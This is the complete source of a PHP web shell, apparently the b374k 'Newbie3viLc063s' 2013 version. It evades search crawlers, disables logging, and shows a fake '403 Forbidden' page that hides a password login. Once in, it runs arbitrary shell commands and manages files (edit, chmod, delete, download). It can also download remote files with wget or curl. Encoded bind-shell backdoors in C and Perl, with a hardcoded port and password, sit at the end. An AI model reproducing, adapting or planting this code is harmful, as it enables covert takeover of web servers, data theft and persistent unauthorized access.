<?php 
/*********************************************************************************************************/
$auth_pass = ""; //password crypted with md5, default is 'Newbie3viLc063s'
/*********************************************************************************************************/
$color = "#00ff00";
$default_action = 'FilesMan';
@define('SELF_PATH', __FILE__);

/*********************************************************************************************************/
# Avoid google's crawler
if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) { header('HTTP/1.0 404 Not Found'); exit; }
/*********************************************************************************************************/

@session_start();
@error_reporting(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@set_time_limit(0);
@set_magic_quotes_runtime(0);
@define('VERSION', 'v.2013');
@define('TITLE', ':: b374k Newbie3viLc063s 2013 ::');

/*********************************************************************************************************/

if( get_magic_quotes_gpc() ) 
{
	function stripslashes_array($array) { return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array); }
	$_POST = stripslashes_array($_POST);
}

function logout()
{
	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
	$page = $host='http://'.$_SERVER['SERVER_NAME'].'/'.$_SERVER['PHP_SELF'];
        echo '<center><span class="b1">The System Is Going To Down For LogOut Administrator Pages!!</scan></center>';
	?>
	<script>window.location.href = '<?php print $page; ?>';</script>
	<?php
	exit(0);
}

function myshellexec($command) {
if (!($p=popen("($command)2>&1","r"))) {
return 126;
}
while (!feof($p)) {
$line=fgets($p,1000);
$out .= $line;
}
pclose($p);
return $out;
}

function parsesort($sort) 
{ 
 $one = intval($sort); 
 $second = substr($sort,-1); 
 if ($second != "d") {$second = "a";} 
 return array($one,$second); 
}

$disablefunc = @ini_get("disable_functions");

function showdisablefunctions() {
    if ($disablefunc=@ini_get("disable_functions")){ return "<span style='color:#00FF1E'>".$disablefunc."</span>"; }
    else { return "<span style='color:#00FF1E'>NONE</span>"; }
  }
  
  function ex($cfe) {
$res = '';
if (!empty($cfe)) {
if(function_exists('exec')) {
@exec($cfe,$res);
$res = join("\n",$res);
} elseif(function_exists('shell_exec')) {
$res = @shell_exec($cfe);
} elseif(function_exists('system')) {
@ob_start();
@system($cfe);
$res = @ob_get_contents();
@ob_end_clean();
} elseif(function_exists('passthru')) {
@ob_start();
@passthru($cfe);
$res = @ob_get_contents();
@ob_end_clean();
} elseif(@is_resource($f = @popen($cfe,"r"))) {
$res = "";
while(!@feof($f)) { $res .= @fread($f,1024); }
@pclose($f);
} else { $res = "Ex() Disabled!"; }
}
return $res;
}


function showstat($stat) {
if ($stat=="on") { return "<b><font style='color:#00FF00'>ON</font></b>"; }
else { return "<b><font style='color:#DD4736'>OFF</font></b>"; }
}
function testperl() {
if (ex('perl -h')) { return showstat("on"); }
else { return showstat("off"); }
}
function testfetch() {
if(ex('fetch --help')) { return showstat("on"); }
else { return showstat("off"); }
}
function testwget() {
if (ex('wget --help')) { return showstat("on"); }
else { return showstat("off"); }
}
function testoracle() {
if (function_exists('ocilogon')) { return showstat("on"); }
else { return showstat("off"); }
}
function testpostgresql() {
if (function_exists('pg_connect')) { return showstat("on"); }
else { return showstat("off"); }
}
function testmssql() {
if (function_exists('mssql_connect')) { return showstat("on"); }
else { return showstat("off"); }
}
function testcurl() {
if (function_exists('curl_version')) { return showstat("on"); }
else { return showstat("off"); }
}
function testmysql() {
if (function_exists('mysql_connect')) { return showstat("on"); }
else { return showstat("off"); }
}

$quotes = get_magic_quotes_gpc();
if ($quotes == "1" or $quotes == "on")
{
$quot = "<font style='color:red'>ON</font>";
}
else
{
$quot = "<font style='color:green'>OFF</font>";
}

function printLogin() 
{
	?>
<html>
	<head>
	<style> input { margin:0;background-color:#fff;border:1px solid #fff; } </style>
	</head>
        <title>
        403 Forbidden
        </title>
        <body>
	<h1>Forbidden</h1>
	<p>You don't have permission to access this file on this server <?=$_SERVER['HTTP_HOST']?>.</p>
	<hr>
	<form method=post>
	<address>Apache/2.2.8 at <?=$_SERVER['HTTP_HOST']?> Port 80<center><input type=password name=x><input type=submit value=''></center></address>
	</form>
	</body>
</html>
	<?php
	exit;
}

if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] ))
	{
	if( empty( $auth_pass ) || ( isset( $_POST['x'] ) && ( md5($_POST['x']) == $auth_pass ) ) )
		{ $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; }
	else
		{ printLogin(); }
	}

if(isset($_GET['dl']) && ($_GET['dl'] != ""))
	{ 
	$file 	= $_GET['dl']; 
	$filez 	= @file_get_contents($file); 
	header("Content-type: application/octet-stream"); 
	header("Content-length: ".strlen($filez)); 
	header("Content-disposition: attachment; 
	filename=\"".basename($file)."\";"); 
	echo $filez; 
	exit; 
	} 

elseif(isset($_GET['dlgzip']) && ($_GET['dlgzip'] != ""))
	{ 
	$file = $_GET['dlgzip']; 
	$filez = gzencode(@file_get_contents($file)); 
	header("Content-Type:application/x-gzip\n"); 
	header("Content-length: ".strlen($filez)); 
	header("Content-disposition: attachment; filename=\"".basename($file).".gz\";"); 
	echo $filez; exit; 
	} 

if(isset($_GET['img']))
	{ 
	@ob_clean(); 
	$d = magicboom($_GET['y']); 
	$f = $_GET['img']; 
	$inf = @getimagesize($d.$f); 
	$ext = explode($f,"."); 
	$ext = $ext[count($ext)-1]; 
	@header("Content-type: ".$inf["mime"]); 
	@header("Cache-control: public"); 
	@header("Expires: ".date("r",mktime(0,0,0,1,1,2030))); 
	@header("Cache-control: max-age=".(60*60*24*7)); 
	@readfile($d.$f); 
	exit; 
	} 
$ver = VERSION;

$DISP_SERVER_SOFTWARE = getenv("SERVER_SOFTWARE");

if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") $safemode = TRUE; 
else $safemode 	= FALSE; 
$system 	= @php_uname(); 

if(strtolower(substr($system,0,3)) == "win") $win = TRUE; 
else $win 	= FALSE; 

if(isset($_GET['y']))
	{ if(@is_dir($_GET['view'])){ $pwd = $_GET['view']; @chdir($pwd); } else{ $pwd = $_GET['y']; @chdir($pwd); } } 

if(!$win)
	{ if(!$user = rapih(exe("whoami"))) $user = ""; if(!$id = rapih(exe("id"))) $id = ""; $prompt = $user." \$ "; $pwd = @getcwd().DIRECTORY_SEPARATOR; } 
else 
	{ 
	$user 	= @get_current_user(); 
	$id 	= $user; 
	$prompt = $user." &gt;"; 
	$pwd 	= realpath(".")."\\"; 
	$v 	= explode("\\",$d); 
	$v 	= $v[0]; 
	foreach (range("A","Z") as $letter) 
		{ 
		$bool = @is_dir($letter.":\\"); 
		if ($bool) 
			{ 
			$letters 	.= "<a href=\"?y=".$letter.":\\\">[ "; 
			if ($letter.":" != $v) {$letters .= $letter;} 
			else {$letters 	.= "<span class=\"gaya\">".$letter."</span>";} 
			$letters 	.= " ]</a> "; 
			} 
		} 
	}

if(function_exists("posix_getpwuid") && function_exists("posix_getgrgid")) $posix = TRUE; 
else $posix = FALSE; 


        $bytes = disk_free_space("."); 
        $si_prefix = array( 'B', 'KB', 'MB', 'GB', 'TB', 'EB', 'ZB', 'YB' );
        $base = 1024;
		$class = min((int)log($bytes , $base) , count($si_prefix) - 1);
        $totalspace_bytes = disk_total_space("."); 
    	$totalspace_si_prefixs = array( 'B', 'KB', 'MB', 'GB', 'TB', 'EB', 'ZB', 'YB' );
        $totalspace_bases = 1024;
		$totalspace_class = min((int)log($totalspace_bytes , $totalspace_bases) , count($totalspace_si_prefixs) - 1);
        $totalspace_show = sprintf('%1.2f' , $totalspace_bytes / pow($totalspace_bases,$totalspace_class)) . ' ' . $totalspace_si_prefixs[$totalspace_class] . '';
        $freespace_show = sprintf('%1.2f' , $bytes / pow($base,$class)) . ' ' . $si_prefix[$class] . '';
	$server_ip 	= @gethostbyname($_SERVER["HTTP_HOST"]); 
	$my_ip 		= $_SERVER['REMOTE_ADDR']; 
	$bindport 	= "55555"; 
	$bindport_pass 	= "Newbie3viLc063s"; 
	$pwds 		= explode(DIRECTORY_SEPARATOR,$pwd); 
	$pwdurl 	= ""; 
	for($i = 0 ; $i < sizeof($pwds)-1 ; $i++)
		{ 
		$pathz 	= ""; 
		for($j 	= 0 ; $j <= $i ; $j++)
			{ 
			$pathz .= $pwds[$j].DIRECTORY_SEPARATOR; 
			} 
		$pwdurl .= "<a href=\"?y=".$pathz."\">".$pwds[$i]." ".DIRECTORY_SEPARATOR." </a>"; 
		}

	if(isset($_POST['rename'])){ 
		$old = $_POST['oldname']; 
		$new = $_POST['newname']; 
		@rename($pwd.$old,$pwd.$new); 
		$file = $pwd.$new; 
		} 
	if(isset($_POST['chmod'])){ 
		$name = $_POST['name']; 
		$value = $_POST['newvalue']; 
		if (strlen($value)==3){
		$value = 0 . "" . $value;
		}
		@chmod($pwd.$name,octdec($value)); 
		$file = $pwd.$name;
		}
	if(isset($_POST['chmod_folder'])){ 
		$name = $_POST['name']; 
		$value = $_POST['newvalue']; 
		if (strlen($value)==3){
		$value = 0 . "" . $value;
		}
		@chmod($pwd.$name,octdec($value)); 
		$file = $pwd.$name;
		}
	$buff = $DISP_SERVER_SOFTWARE."<br />"; 
	$buff .= '<font style="color:#F58F78">'.$system.'</font><br />'; 
	if($id != "") $buff .= $id."<br />"; 
	$buff .= "Server IP : "."<span style='color:#FF8800'>$server_ip</span>"."<font> | </font>"."Your IP : "."<span style='color:#FF0000'>$my_ip</span>"."<br />";
        $buff .= "Total HDD Space : "."<span style='color:#00FF1E'>$totalspace_show</span>"."<font> | </font>"."Free HDD Space : "."<span style='color:#00FF1E'>$freespace_show</span>"."<br />";
		$buff .=  "Magic Quotes:$quot"."<br>";
		$buff .= "Disabled Functions: ".showdisablefunctions()."<br>";
		$buff .= "MySQL: ".testmysql()." MSSQL: ".testmssql()." Oracle: ".testoracle()." MSSQL: ".testmssql()." PostgreSQL: ".testpostgresql()." cURL: ".testcurl()." WGet: ".testwget()." Fetch: ".testfetch()." Perl: ".testperl()."<br>";
	if($safemode) $buff .= "safemode <span class=\"gaya\">ON</span><br />"; 
	else $buff .= "safemode <span class=\"gaya\">OFF<span><br />"; 
	$buff .= $letters."&nbsp;&gt;&nbsp;".$pwdurl; 

	function rapih($text){ return trim(str_replace("<br />","",$text)); } 

	function magicboom($text){ if (!get_magic_quotes_gpc()) { return $text; } return stripslashes($text); } 

	function showdir($pwd,$prompt)
	{ 
		$fname = array(); 
		$dname = array(); 
		if(function_exists("posix_getpwuid") && function_exists("posix_getgrgid")) $posix = TRUE; 
		else $posix = FALSE; 
		$user = "????:????"; 
		if($dh = opendir($pwd))
			{ 
			while($file = readdir($dh))
				{ 
				if(is_dir($file))
					{ $dname[] = $file; } 
				elseif(is_file($file))
					{ $fname[] = $file; } 
				} 
			closedir($dh); 
			} 
		sort($fname); 
		sort($dname); 
		$path = @explode(DIRECTORY_SEPARATOR,$pwd); 
		$tree = @sizeof($path); 
		$parent = ""; 
		$buff = "<form action=\"?y=".$pwd."&amp;x=shell\" method=\"post\" style=\"margin:8px 0 0 0;\"> 
				<table class=\"cmdbox\" style=\"width:50%;\"> 
				<tr>
				<td>CMD@$prompt</td>
				<td><input onMouseOver=\"this.focus();\" id=\"cmd\" class=\"inputz\" type=\"text\" name=\"cmd\" style=\"width:400px;\" value=\"\" />
				<input class=\"inputzbut\" type=\"submit\" value=\"Execute !\" name=\"submitcmd\" style=\"width:80px;\" /></td>
				</tr> 
			</form> 
			<form action=\"?\" method=\"get\" style=\"margin:8px 0 0 0;\"> 
				<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" /> 
				<tr>
				<td>view file/folder</td>
				<td><input onMouseOver=\"this.focus();\" id=\"goto\" class=\"inputz\" type=\"text\" name=\"view\" style=\"width:400px;\" value=\"".$pwd."\" />
				<input class=\"inputzbut\" type=\"submit\" value=\"Enter !\" name=\"submitcmd\" style=\"width:80px;\" /></td>
				</tr> 
			</form>
			</table>
			<table class=\"explore\"> 
				<tr>
				<th>name</th>
				<th style=\"width:80px;\">size</th>
				<th style=\"width:210px;\">owner:group</th>
				<th style=\"width:80px;\">perms</th>
				<th style=\"width:110px;\">modified</th>
				<th style=\"width:190px;\">actions</th>
				</tr> "; 

		if($tree > 2) for($i=0;$i<$tree-2;$i++) $parent .= $path[$i].DIRECTORY_SEPARATOR; 
		else $parent = $pwd; 
		foreach($dname as $folder)
			{ 
			if($folder == ".") 
				{ 
				if(!$win && $posix)
					{ 
					$name=@posix_getpwuid(@fileowner($folder)); 
					$group=@posix_getgrgid(@filegroup($folder)); 
					$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name']; 
					} 
				else { $owner = $user; } 
				$buff .= "<tr>
						<td><a href=\"?y=".$pwd."\">$folder</a></td>
						<td>-</td>
						<td style=\"text-align:center;\">".$owner."</td>
						<td><center>".get_perms($pwd)."</center></td>
						<td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($pwd))."</td>
						<td><span id=\"titik1\">
							<a href=\"?y=$pwd&amp;edit=".$pwd."newfile.php\">newfile</a> 
							| <a href=\"javascript:tukar('titik1','titik1_form');\">newfolder</a>
						    </span> 
						<form action=\"?\" method=\"get\" id=\"titik1_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
							<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" /> 
							<input class=\"inputz\" style=\"width:140px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" /> 
							<input class=\"inputzbut\" type=\"submit\" name=\"rename\" style=\"width:35px;\" value=\"Go\" /> 
						</form>
						</td>
					</tr> "; 
				} 
			elseif($folder == "..") 
				{ 
				if(!$win && $posix)
					{ 
					$name=@posix_getpwuid(@fileowner($folder)); 
					$group=@posix_getgrgid(@filegroup($folder)); 
					$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name']; 
					} 
				else 	{ $owner = $user; } 
				$buff .= "<tr>
						<td>
						<a href=\"?y=".$parent."\"><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAadEVYdFNvZnR3YXJlAFBhaW50Lk5FVCB2My41LjEwMPRyoQAAAgZJREFUOE9jYKAF4I7ez6CVfVQvpOOiGcnm8yUdYVRvuWalvvjNTemqi01cUfuJN4Mv/QSjRsdNG81VH6/Lb/vzT6juWhtP/CFGokwQyD3DqNpxy1Zj5YdrCjv+/Zfb+uefSNPNNt6044QNECy5wKjUesNadcHr63Jrv/2XAWL5NV//W819sk9/6sMcMJ4GwXpTHiboTLpvpzXhnoxx/x0WBsHKywzyjdfNlKY9uSU1781/SSQsMef1f4nZr1DxrJcvJWe+XC45/XmIQv8DfgbBqqvScl1374r1Pfwv2gvDD4BsGIaIgeTF+h/9F5vw+I3YxMfrxCY+iQLyBRlEaq+JSjTdWCfRfPOPUMON/zAsDGSLNt38L4aGRZtvvhFrvrVOtOV2FBALMgjVXGMUb7qpIdNxZ51U193fIu13/4OwKBDrdj74bDbzwRNkbDrj/mXj6fdnGk6976/Xd58fHEPA0GaS7LirLdf3YI10/8NfolDviLU8WAQ01E66664tHHffNZftuasq33NPWLXjPgs8ikU77jFL9T3UkZ38ZI3U1Ge/xKc8+wf0Z5tI5z1GoIvQMQNQjEG07S5qEhHve8QsNfmpjvSM52ukZ736JT7pRRvQIMLpANkYoAZm6ZkvtDVmvVktWPK6SmL6K9IMABkmM/slk+qMN7Iy/W/kxKe/ISolk60IAJfcKhfb3kZPAAAAAElFTkSuQmCC' />  $folder</a></td>
						<td>-</td>
						<td style=\"text-align:center;\">".$owner."</td>
						<td><center>".get_perms($parent)."</center></td>
						<td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($parent))."</td>
						<td><span id=\"titik2\">
							<a href=\"?y=$pwd&amp;edit=".$parent."newfile.php\">newfile</a> 
							| <a href=\"javascript:tukar('titik2','titik2_form');\">newfolder</a>
						    </span> 
						<form action=\"?\" method=\"get\" id=\"titik2_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
							<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" /> 
							<input class=\"inputz\" style=\"width:140px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" /> 
							<input class=\"inputzbut\" type=\"submit\" name=\"rename\" style=\"width:35px;\" value=\"Go\" /> 
						</form> 
						</td>
					</tr>"; 
				} 
			else 
				{ 
				if(!$win && $posix)
					{ 
					$name=@posix_getpwuid(@fileowner($folder)); 
					$group=@posix_getgrgid(@filegroup($folder)); 
					$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name']; 
					} 
				else { $owner = $user; } 
				$buff .= "<tr>
						<td>
						<a id=\"".clearspace($folder)."_link\" href=\"?y=".$pwd.$folder.DIRECTORY_SEPARATOR."\"><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAALGPC/xhBQAAAAlwSFlzAAAOwgAADsIBFShKgAAAABp0RVh0U29mdHdhcmUAUGFpbnQuTkVUIHYzLjUuMTAw9HKhAAACkUlEQVQ4T8WT2UvUURzFz2NRT5pab9ZDYZNMLjNq6rg1Fqhl5cw8qA+2kJmBgxKUhVpW4y6FZblkaRROpkQLITKG1ERhC5JMuaVmzuQWBD3e27nN0D/QQz/48P1+7znne+/LD/jvn14XtUYXqU+O0kebY2NiLfFxBkuiIcmSnJRiMe5MtexK3W02phjNSYnJZkN8gikmeoeJGRMzRr1OvxZbQzTBZCBUE+oJD4vwcJEnNibOY4hL8HCRJzEh6U/PMzc1d/j2CPc2TaibmSFNiGYT7hT7nbyU579y4dA6WXUsQNacCJR1RYGyoThINpZs8LFe1luD/mi2/ABZedBf2vL8fnSV+JdhohZPJ+sgv16H9NyGXOyGXH4AudLLetfLSh8rZ6Upj/JOMTNRAwfGa9A3Wetb0OlbQPPSffZdXpbZ/11Aj1qgMuPVeIYxG7rGbZAzTZDzHZDfeeOindxjf5M3tkMuMLTEswVqyjNzleEqSGZ74KrEZVcFn1QPMcfN7g4IPlPMN0N8a/IyR9xthJryTDVAuM5Bus6jBaPlKB85xW0XIaYb+bxrkLNXIL5UQxJVxRRfOM0LZnmz8iivyoyWwYaRUhS8LYL4WArxuRJiooq1AuLTGR9nOZd5z5Q2Ro/yqszIaVgxbEXmy8OQbwoh3pdAvrNCvD4KMXwccriAVVFIPR/iQzGhR3lfMMOsCY4chPVb8JPIwVzI5zmQA2aI/
izO7AezOVNzZEMM5VGnR3nJL0cuInErHcH2DHTb0+DszcSrh1lwPjb7sMD5hKj5kQlOpfXRY0+HszsDPZ0Z2IjcMKyuTsXm5jRob+yBtnUftG0HSBa07QqTt7bu92ote6FtToeWmS1HdFj1zz/zb9ZqmlZ866Y6AAAAAElFTkSuQmCC' />  [ $folder ]</a> 
						<form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($folder)."_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
							<input type=\"hidden\" name=\"oldname\" value=\"".$folder."\" style=\"margin:0;padding:0;\" /> 
							<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"".$folder."\" /> 
							<input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" /> 
							<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" 
							onclick=\"tukar('".clearspace($folder)."_form','".clearspace($folder)."_link');\" />
						</form> 
						</td>
						<td>DIR</td>
						<td style=\"text-align:center;\">".$owner."</td>
						<td><center>
						<a href=\"javascript:tukar('".clearspace($folder)."_link','".clearspace($folder)."_form3');\">".get_perms($pwd.$folder)."</a>
							<form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($folder)."_form3\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
							<input type=\"hidden\" name=\"name\" value=\"".$folder."\" style=\"margin:0;padding:0;\" /> 
							<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newvalue\" value=\"".substr(sprintf('%o', fileperms($pwd.$folder)), -4)."\" /> 
							<input class=\"inputzbut\" type=\"submit\" name=\"chmod_folder\" value=\"chmod\" /> 
							<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" 
							onclick=\"tukar('".clearspace($folder)."_link','".clearspace($folder)."_form3');\" />
					</form>
					</center></td>
						<td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($folder))."</td>
						<td><a href=\"javascript:tukar('".clearspace($folder)."_link','".clearspace($folder)."_form');\">rename</a> 
						| <a href=\"?y=$pwd&amp;fdelete=".$pwd.$folder."\">delete</a>
						</td>
						</tr>"; 
				} 
			} 
		foreach($fname as $file)
			{ 
			$full = $pwd.$file; 
			if(!$win && $posix)
				{ 	
				$name=@posix_getpwuid(@fileowner($file)); 
				$group=@posix_getgrgid(@filegroup($file)); 
				$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name']; 
				} 
			else { $owner = $user; } 
			$buff .= "<tr>
					<td>
					<a id=\"".clearspace($file)."_link\" href=\"?y=$pwd&amp;view=$full\"><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAadEVYdFNvZnR3YXJlAFBhaW50Lk5FVCB2My41LjEwMPRyoQAAAXVJREFUOE+NkjtPwlAYhv0DLEZJSDQawQCTcYD/YWIkzqx0cHT1D7C4nMRFSdOWi4uzm9FFXcRBI3KxQGlLoYCAILyekhiRw6UneZKmeb8n79eepaW/43e5XFGfz0csvF4v8Xi2yfrGJllecRIa2xnLMo+OcDis6kYNulEfUdEMZD/KuH1IQ7y6RiQS0eZJAolkig6U/pHJy0i/vOPm/gnlikYl3ExJMJm6hFxWGQpFhUqyKJQqyNFGHMfptMnu5A5UkBrVZqkiLyt4zcrI5It4y8nY2w9ZkrVxSdBaoVozZ6LqtVGDu8dnHB2fgA4HGYHZaGE2TRj1BoqKhlNyxgriiSRan+2FmM0WYrzACiQq6HS7C2l3uhDjiSkC+vKr17OFNE0gSnH0+9+2sLLMRxRECYPBwBaCOEXACyKGw6EteEFiGgTOYzzsnguapSsExu+B4yB0qJYUlf5rcy5WxsrSYcfkdfavOp3RLbebzMPK0EH/7/APv59j7X+gJNIAAAAASUVORK5CYII%3D' />  $file</a> 
					<form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($file)."_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
						<input type=\"hidden\" name=\"oldname\" value=\"".$file."\" style=\"margin:0;padding:0;\" /> 
						<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"".$file."\" /> 
						<input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" /> 
						<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" 
							onclick=\"tukar('".clearspace($file)."_link','".clearspace($file)."_form');\" />
					</form>
					</td>
					<td>".ukuran($full)."</td>
					<td style=\"text-align:center;\">".$owner."</td>
					<td><center>
					<a href=\"javascript:tukar('".clearspace($file)."_link','".clearspace($file)."_form2');\">".get_perms($full)."</a>
					<form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($file)."_form2\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
						<input type=\"hidden\" name=\"name\" value=\"".$file."\" style=\"margin:0;padding:0;\" /> 
						<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newvalue\" value=\"".substr(sprintf('%o', fileperms($full)), -4)."\" /> 
						<input class=\"inputzbut\" type=\"submit\" name=\"chmod\" value=\"chmod\" /> 
						<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" 
							onclick=\"tukar('".clearspace($file)."_link','".clearspace($file)."_form2');\" />
					</form></center></td>
					<td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($full))."</td> 
					<td>
					<a href=\"?y=$pwd&amp;edit=$full\">edit</a> 
					| <a href=\"javascript:tukar('".clearspace($file)."_link','".clearspace($file)."_form');\">rename</a>
					| <a href=\"?y=$pwd&amp;delete=$full\">delete</a> 
					| <a href=\"?y=$pwd&amp;dl=$full\">download</a>&nbsp;(<a href=\"?y=$pwd&amp;dlgzip=$full\">gz</a>)
					</td>
				</tr>"; 
			} 
		$buff .= "</table>"; return $buff; 
	} 

	function ukuran($file)
	{ 
		if($size = @filesize($file))
			{ 	
			if($size <= 1024) return $size; 
			else
				{ 
				if($size <= 1024*1024) 
					{ $size = @round($size / 1024,2);; return "$size kb"; } 
				else { $size = @round($size / 1024 / 1024,2); return "$size mb"; } 
				} 
			} 
		else return "???"; 
	} 

	function exe($cmd)
	{ 
		if(function_exists('system')) 
			{ 
			@ob_start(); 
			@system($cmd); 
			$buff = @ob_get_contents();
			@ob_end_clean(); 
			return $buff; 
			} 
		elseif(function_exists('exec')) 
			{ 
			@exec($cmd,$results); 
			$buff = ""; 
			foreach($results as $result)
				{ $buff .= $result; } 
			return $buff; 
			} 
		elseif(function_exists('passthru')) 
			{ 
			@ob_start(); 
			@passthru($cmd); 
			$buff = @ob_get_contents(); 
			@ob_end_clean(); 
			return $buff; 
			} 
		elseif(function_exists('shell_exec'))
			{ 
			$buff = @shell_exec($cmd); 
			return $buff; 
			} 
	} 

	function tulis($file,$text)
	{ 
	$textz = gzinflate(base64_decode($text)); 
	if($filez = @fopen($file,"w")) 
		{ 
		@fputs($filez,$textz); 
		@fclose($file); 
		} 
	} 
	
	function tulis_2($file,$text)
	{ 
	$textz = base64_decode($text); 
	if($filez = @fopen($file,"w")) 
		{ 
		@fputs($filez,$textz); 
		@fclose($file); 
		} 
	} 

	function ambil($link,$file) 
	{ 
	if($fp = @fopen($link,"r"))
		{ 
		while(!feof($fp)) 
			{ 
			$cont.= @fread($fp,1024); 
			} 
		@fclose($fp); 
		$fp2 = @fopen($file,"w"); 
		@fwrite($fp2,$cont); 
		@fclose($fp2); 
		} 
	} 

	function which($pr)
	{ 
	$path = exe("which $pr"); 
	if(!empty($path)) 
		{ return trim($path); } 
	else { return trim($pr); } 
	} 

	function download($cmd,$url)
	{ 
	$namafile = basename($url); 
	switch($cmd) 
		{ 
		case 'wwget': exe(which('wget')." ".$url." -O ".$namafile); break; 
		case 'wlynx': exe(which('lynx')." -source ".$url." > ".$namafile); break; 
		case 'wfread' : ambil($wurl,$namafile);break; 
		case 'wfetch' : exe(which('fetch')." -o ".$namafile." -p ".$url);break; 
		case 'wlinks' : exe(which('links')." -source ".$url." > ".$namafile);break; 
		case 'wget' : exe(which('GET')." ".$url." > ".$namafile);break; 
		case 'wcurl' : exe(which('curl')." ".$url." -o ".$namafile);break; 
		default: break; } 
	return $namafile; 
	} 

	function get_perms($file) 
	{ 
		if($mode=@fileperms($file))
			{ 
			$perms=''; 
			$perms .= ($mode & 00400) ? 'r' : '-'; 
			$perms .= ($mode & 00200) ? 'w' : '-'; 
			$perms .= ($mode & 00100) ? 'x' : '-'; 
			$perms .= ($mode & 00040) ? 'r' : '-'; 
			$perms .= ($mode & 00020) ? 'w' : '-'; 
			$perms .= ($mode & 00010) ? 'x' : '-'; 
			$perms .= ($mode & 00004) ? 'r' : '-'; 
			$perms .= ($mode & 00002) ? 'w' : '-'; 
			$perms .= ($mode & 00001) ? 'x' : '-'; 
			return $perms; 
			} 
		else return "??????????"; 
	} 

	function clearspace($text){ return str_replace(" ","_",$text); } 

	$port_bind_bd_c="bVNhb9owEP2OxH+4phI4NINAN00aYxJaW6maxqbSLxNDKDiXxiLYkW3KGOp/3zlOpo7xIY793jvf +fl8KSQvdinCR2NTofr5p3br8hWmhXw6BQ9mYA8lmjO4UXyD9oSQaAV9AyFPCNRa+pRCWtgmQrJE P/GIhufQg249brd4nmjo9RxBqyNAuwWOdvmyNAKJ+ywlBirhepctruOlW9MJdtzrkjTVKyFB41ZZ dKTIWKb0hoUwmUAcwtFt6+m+EXKVJVtRHGAC07vV/ez2cfwvXSpticytkoYlVglX/fNiuAzDE6VL 3TfVrw4o2P1senPzsJrOfoRjl9cfhWjvIatzRvNvn7+s5o8Pt9OvURzWZV94dQgleag0C3wQVKug Uq2FTFnjDzvxAXphx9cXQfxr6PcthLEo/8a8q8B9LgpkQ7oOgKMbvNeThHMsbSOO69IA0l05YpXk HDT8HxrV0F4LizUWfE+M2SudfgiiYbONxiStebrgyIjfqDJG07AWiAzYBc9LivU3MVpGFV2x1J4W tyxAnivYY8HVFsEqWF+/f7sBk2NRQKcDA/JtsE5MDm9EUG+MhcFqkpX0HmxGbqbkdBTMldaHRsUL ZeoDeOSFBvpefCfXhflOpgTkvJ+jtKiR7vLohYKCqS2ZmMRj4Z5gQZfSiMbi6iqkdnHarEEXYuk6 uPtTdumsr0HC4q5rrzNifV7sC3ZWUmq+LVlVa5OfQjTanZYQO+Uf"; 
	$port_bind_bd_pl="ZZJhT8IwEIa/k/AfjklgS2aA+BFmJDB1cW5kHSZGzTK2Qxpmu2wlYoD/bruBIfitd33uvXuvvWr1 NmXRW1DWy7HImo02ebRd19Kq1CIuV3BNtWGzQZeg342DhxcYwcCAHeCWCn1gDOEgi1yHhLYXzfwg tNqKeut/yKJNiUB4skYhg3ZecMETnlmfKKrz4ofFX6h3RZJ3DUmUFaoTszO7jxzPDs0O8SdPEQkD e/xs/gkYsN9DShG0ScwEJAXGAqGufmdq2hKFCnmu1IjvRkpH6hE/Cuw5scfTaWAOVE9pM5WMouM0 LSLK9HM3puMpNhp7r8ZFW54jg5wXx5YZLQUyKXVzwdUXZ+T3imYoV9ds7JqNOElQTjnxPc8kRrVo vaW3c5paS16sjZo6qTEuQKU1UO/RSnFJGaagcFVbjUTCqeOZ2qijNLWzrD8PTe32X9oOgvM0bjGB +hecfOQFlT4UcLSkmI1ceY3VrpKMy9dWUCVCBfTlQX6Owy8="; 

